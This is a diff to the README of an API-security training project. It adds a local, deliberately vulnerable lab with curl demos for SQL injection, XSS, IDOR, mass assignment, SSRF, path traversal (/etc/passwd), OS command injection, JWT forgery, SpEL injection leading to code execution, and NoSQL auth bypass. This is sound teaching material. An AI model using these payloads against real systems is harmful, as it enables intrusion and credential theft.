@@ -46,7 +46,7 @@ testable group of REST endpoints.
 | 12 | OpenID Connect | `/api/ch12/**` (ID token issue/validate, userinfo) |
 | 13 | JWT, JWS, JWE | `/api/ch13/**` (JWS sign/verify, JWE encrypt/decrypt) |
 | 14 | Patterns and Practices | see [BOOK-SUMMARY.md](BOOK-SUMMARY.md) (composed from ch4/8/9b/11/12/13) |
-| Lab | Web-attack basics: SQL injection, XSS | `/api/lab/sqli/**`, `/api/lab/xss/**` (see [VULNERABILITY-SCENARIOS.md](VULNERABILITY-SCENARIOS.md) #8-9) |
+| Lab | Web/API attack basics (deliberately vulnerable) | `/api/lab/**` - SQLi, XSS, IDOR/BOLA, Mass Assignment, SSRF, Path Traversal, Command Injection, JWT (alg:none/weak key), SSTI, NoSQL injection (see [VULNERABILITY-SCENARIOS.md](VULNERABILITY-SCENARIOS.md) #8-17) |
 
 Chapter 6 (OAuth 1.0) is provided as a **mechanics playground** (signature base
 string, HMAC-SHA1/PLAINTEXT signature, nonce replay guard) rather than a full
@@ -392,52 +392,84 @@ curl -s -X POST http://localhost:19080/api/ch13/jwe/decrypt -H 'Content-Type: ap
   -d "{\"jwt\":\"$JWE\"}"
 ```
 
-## Web-attack basics lab - SQL injection & XSS
+## Web/API attack lab (deliberately vulnerable)
 
-> **Deliberately vulnerable, for local training only.** The book focuses on API
-> auth (OAuth/OIDC/JWT/mTLS) and the rest of this project is in-memory JSON APIs
-> with no SQLi/XSS surface. This lab adds a real SQL database and HTML rendering
-> so classic web attacks can be practised. Never expose `/api/lab/**` publicly.
-> Full walkthrough (payloads, root cause, fixes): [VULNERABILITY-SCENARIOS.md](VULNERABILITY-SCENARIOS.md) #8-9.
+> **For local training only.** The book focuses on API auth (OAuth/OIDC/JWT/mTLS)
+> and the rest of this project is in-memory JSON APIs, so it has no classic
+> web-attack surface. This lab adds real SQL/NoSQL databases, HTML rendering and
+> expression evaluation so common attacks can be practised - each with a
+> vulnerable and a safe variant. **Never expose `/api/lab/**` publicly** (it is
+> unauthenticated by design). Full walkthrough (payloads, root cause, fixes):
+> [VULNERABILITY-SCENARIOS.md](VULNERABILITY-SCENARIOS.md) #8-17.
 
-Runs on H2 in-memory by default (no external DB). Switch DB with a Spring
-profile - host ports default to non-standard values (PostgreSQL 15432, MySQL
-13306) to avoid clashes, and are overridable so nothing collides:
+Runs on H2 in-memory by default (no external DB, no Docker). SQL injection can
+also run against PostgreSQL/MySQL, and NoSQL injection needs MongoDB, via Spring
+profiles. **DB host ports default to non-standard values (PostgreSQL 15432,
+MySQL 13306, MongoDB 17017) and one variable feeds both the container and the
+app**, so nothing clashes:
 
 ```bash
-# Default: H2 in-memory
+# Default: H2 in-memory (covers everything except NoSQL injection)
 mvn spring-boot:run
 
-# PostgreSQL (needs Docker): start DB, then run with the profile
-docker compose up -d postgres
-SPRING_PROFILES_ACTIVE=postgres mvn spring-boot:run
-#   15432 busy? one variable feeds both the container and the app:
-#   PG_PORT=25432 docker compose up -d postgres
-#   PG_PORT=25432 SPRING_PROFILES_ACTIVE=postgres mvn spring-boot:run
+# SQL injection against PostgreSQL / MySQL (needs Docker)
+docker compose up -d postgres && SPRING_PROFILES_ACTIVE=postgres mvn spring-boot:run
+docker compose up -d mysql    && SPRING_PROFILES_ACTIVE=mysql    mvn spring-boot:run
+#   port busy? e.g.  PG_PORT=25432 docker compose up -d postgres
+#                    PG_PORT=25432 SPRING_PROFILES_ACTIVE=postgres mvn spring-boot:run
 
-# MySQL (needs Docker)
-docker compose up -d mysql
-SPRING_PROFILES_ACTIVE=mysql mvn spring-boot:run
-#   MYSQL_PORT=23306 docker compose up -d mysql && MYSQL_PORT=23306 SPRING_PROFILES_ACTIVE=mysql mvn spring-boot:run
+# NoSQL injection against MongoDB (needs Docker)
+docker compose up -d mongo    && SPRING_PROFILES_ACTIVE=mongo    mvn spring-boot:run
+#   MONGO_PORT=27717 docker compose up -d mongo && MONGO_PORT=27717 SPRING_PROFILES_ACTIVE=mongo mvn spring-boot:run
 ```
 
 ```bash
-# --- SQL injection ---
-# vulnerable: ' OR '1'='1  dumps every row; UNION SELECT leaks lab_users creds
+# --- SQL injection (#8) ---
 curl -s --get http://localhost:19080/api/lab/sqli/search --data-urlencode "name=' OR '1'='1"
 curl -s --get http://localhost:19080/api/lab/sqli/search \
-  --data-urlencode "name=' UNION SELECT id, password, id FROM lab_users --"
-# safe (parameterized): same payload matches nothing
+  --data-urlencode "name=' UNION SELECT id, password, id FROM lab_users --"   # leaks creds
 curl -s --get http://localhost:19080/api/lab/sqli/search-safe --data-urlencode "name=' OR '1'='1"
 
-# --- XSS (open the vulnerable URLs in a browser to see the script run) ---
-# reflected
-curl -s --get http://localhost:19080/api/lab/xss/reflect      --data-urlencode "msg=<script>alert(1)</script>"
-curl -s --get http://localhost:19080/api/lab/xss/reflect-safe --data-urlencode "msg=<script>alert(1)</script>"
-# stored
+# --- XSS (#9) - open the vulnerable URLs in a browser to see the script run ---
+curl -s --get http://localhost:19080/api/lab/xss/reflect --data-urlencode "msg=<script>alert(1)</script>"
 curl -s -X POST http://localhost:19080/api/lab/xss/comments -H 'Content-Type: application/json' \
   -d '{"author":"attacker","comment":"<img src=x onerror=alert(document.domain)>"}'
-#   then open  /api/lab/xss/comments/view  (vulnerable)  vs  /api/lab/xss/comments/view-safe
+#   then open /api/lab/xss/comments/view (vulnerable) vs /api/lab/xss/comments/view-safe
+
+# --- IDOR/BOLA (#10) - read someone else's object by id ---
+curl -s "http://localhost:19080/api/lab/idor/orders/1002?asUser=alice"           # vulnerable
+curl -s "http://localhost:19080/api/lab/idor/orders-safe/1002?asUser=alice"      # 403
+
+# --- Mass assignment (#11) - overwrite the role field ---
+curl -s -X POST "http://localhost:19080/api/lab/idor/profile?asUser=alice" \
+  -H 'Content-Type: application/json' -d '{"displayName":"Alice","role":"ADMIN"}'   # role->ADMIN
+
+# --- SSRF (#12) - make the server fetch an internal-only endpoint ---
+curl -s --get http://localhost:19080/api/lab/ssrf/fetch \
+  --data-urlencode "url=http://localhost:19080/api/lab/ssrf/internal-metadata"
+
+# --- Path traversal (#13) ---
+curl -s --get http://localhost:19080/api/lab/ssrf/file --data-urlencode "name=../../../../../../etc/passwd"
+
+# --- OS command injection (#14) ---
+curl -s --get http://localhost:19080/api/lab/cmdi/lookup --data-urlencode "host=x; id"
+
+# --- JWT: alg:none forgery + weak-key crack (#15) ---
+FORGE=$(curl -s -X POST http://localhost:19080/api/lab/jwt/forge-alg-none -H 'Content-Type: application/json' \
+  -d '{"subject":"attacker","role":"ADMIN"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['jwt'])")
+curl -s -X POST http://localhost:19080/api/lab/jwt/verify-insecure -H 'Content-Type: application/json' -d "{\"token\":\"$FORGE\"}"
+WEAK=$(curl -s -X POST http://localhost:19080/api/lab/jwt/issue-weak -H 'Content-Type: application/json' \
+  -d '{"subject":"alice"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['jwt'])")
+curl -s -X POST http://localhost:19080/api/lab/jwt/crack -H 'Content-Type: application/json' -d "{\"token\":\"$WEAK\"}"
+
+# --- SSTI / SpEL injection -> RCE (#16) ---
+curl -s --get http://localhost:19080/api/lab/ssti/greet \
+  --data-urlencode "name=new String(T(java.lang.Runtime).getRuntime().exec('id').getInputStream().readAllBytes())"
+
+# --- NoSQL injection (#17) - MongoDB profile only ---
+#   SPRING_PROFILES_ACTIVE=mongo (with docker compose up -d mongo)
+curl -s -X POST http://localhost:19080/api/lab/nosqli/login -H 'Content-Type: application/json' \
+  -d '{"username":"admin","password":{"$ne":null}}'      # auth bypass without the password
 ```
 
 ---
@@ -459,15 +491,17 @@ src/main/java/com/example/apisecurity/
   ch11/   Federation (external IdP + the JWT Bearer grant from ch9)
   ch12/   OpenID Connect (ID token issue/validate, userinfo)
   ch13/   JWT/JWS/JWE (HS256/RS256 sign+verify, RSA-OAEP+A128GCM encrypt+decrypt)
-  lab/    Deliberately-vulnerable web-attack lab: SQL injection + XSS
-          (real SQL DB via H2/PostgreSQL/MySQL profiles) - LOCAL TRAINING ONLY
+  lab/    Deliberately-vulnerable web/API attack lab - LOCAL TRAINING ONLY:
+          SQLi, XSS, IDOR/BOLA + Mass Assignment, SSRF + Path Traversal,
+          Command Injection, JWT (alg:none/weak key), SSTI (SpEL),
+          NoSQL injection (MongoDB, mongo profile)
   common/ Cross-chapter utilities (rate limiter)
   config/ All SecurityFilterChain / Authorization Server wiring
 src/main/resources/
   db/       schema-{h2,postgresql,mysql}.sql + data.sql (lab tables)
-  application-postgres.yml / application-mysql.yml       (lab DB profiles)
+  application-postgres.yml / application-mysql.yml / application-mongo.yml
 certs/    TLS key material generation script for Chapter 4
-docker-compose.yml   PostgreSQL/MySQL for the lab (overridable host ports)
+docker-compose.yml   PostgreSQL / MySQL / MongoDB for the lab (overridable host ports)
 ```
 
 Multiple `@Order`-ed `SecurityFilterChain` beans route different URL
